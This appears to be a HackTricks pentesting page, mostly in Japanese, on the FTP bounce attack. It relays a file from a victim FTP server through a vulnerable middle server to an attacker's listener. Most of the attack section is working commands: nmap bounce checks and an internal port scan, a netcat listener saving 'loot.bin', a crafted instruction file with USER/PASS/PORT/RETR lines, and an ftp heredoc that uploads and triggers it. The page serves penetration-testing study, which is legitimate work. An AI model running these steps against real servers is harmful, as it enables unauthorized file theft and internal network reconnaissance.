# FTP Bounce Download 2 of FTP File

{{#include ../../banners/hacktricks-training.md}}


## 概要

もし**bounce FTP サーバー**にアクセスできる場合、別の**FTPサーバー**（そこに関する認証情報を知っている）からファイルを要求させ、そのファイルを**自分のサーバー**にダウンロードさせることができます。

## 要件

- **FTP 中間サーバー**の有効なFTP認証情報
- **被害者FTPサーバー**の有効なFTP認証情報
- 両方のサーバーが **`PORT` コマンドを受け入れる**（bounce FTP attack）
- **FTP 中間サーバー**のあるディレクトリに**書き込み**できること
- 中間サーバーは、あなたよりも被害者FTPサーバー内で**より多くのアクセス権**を持っていること

## 手順

1. **自分のFTPサーバー**に接続し、接続をパッシブにする（`pasv` コマンド）ことで、被害者のサービスがファイルを送信するディレクトリで**待ち受ける**ようにします。
2. FTP中間サーバーが被害者サーバーに送るファイル（**exploit script**）を作成します。このファイルは平文テキストで、被害者サーバーに対する認証、ディレクトリ移動、そして自分のサーバーへファイルをダウンロードするための必要なコマンドを含みます。
3. **FTP 中間サーバー**に接続し、前述のファイルをアップロードします。
4. FTP中間サーバーに被害者サーバーとの**接続を確立**させ、exploitファイルを送信させます。
5. 自分のFTPサーバーでそのファイルを**受信**します。
6. FTP中間サーバーからexploitファイルを**削除**します。

## 脆弱な bounce ホストの簡易チェック

- **Nmap** はまだFTP bounceチェックをサポートしています。潜在的な中間サーバーを検証する例：
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
If the server refuses third‑party `PORT` values the scan will fail; some **組み込み/レガシーなプリンター、NAS、およびアプライアンスのFTPデーモン** はまだこれを許可します。

## 第2のFTPダウンロードの自動化

以下は脆弱な中間FTPサーバーを経由してファイルを取得する、現代的に改良した方法です。

1. **攻撃用ボックスでパッシブリスナーを開く**（任意のTCP sinkで可）:
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **自身のIPを** `A,B,C,D` **として、ポート** `P` **を** `p1,p2` **としてメモする**（`p1 = P/256`, `p2 = P%256`）。

3. **中間サーバーが被害者に再生する指示ファイルを作成する**:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **中間サーバーからアップロードしてトリガーする**（クラシックなproxy FTP）:
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **リスナーからファイルを取得する**（`loot.bin`）。
6. **中間サーバー上のアップロードした** `instrs` **ファイルを削除して片付ける**。

Notes:
- パディング（`dd ...`）は RETR が完了する前に制御接続が閉じるのを防ぎます（従来の解説で議論されている大きなTCPウィンドウ問題）。
- TCPを**リッスンしてダンプ**できる任意のサービスは、FTPのPASVソケットの代わりに使用できます（例: `socat -u TCP-LISTEN:2121,fork - > loot.bin`）。
- 中間サーバーが特権ポートを制限している場合、`PORT` に高位ポートを指定し、リスナーをそれに合わせて調整してください。

## 追加のトリック

- ファイル中継がブロックされている場合、バウンス可能なFTPサーバーを使って内部ホストを**ポートスキャン**する:
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- 一部のモダンなWAF/IDS（例: Juniper IPS）は**FTP:EXPLOIT:BOUNCE-ATTACK**専用のシグネチャを用意しており、過度にノイジーなペイロードやパディング不足が検出される可能性があります。
- 中間サーバーが「PORTを同一ホストのみ許可する」制限を課している場合、（書き込み/実行権があるなら）**リスナーを中間サーバー自身に配置**し、取得したファイルを後で転送してください。

For a more detailed old-school walkthrough check: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## 参考資料

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
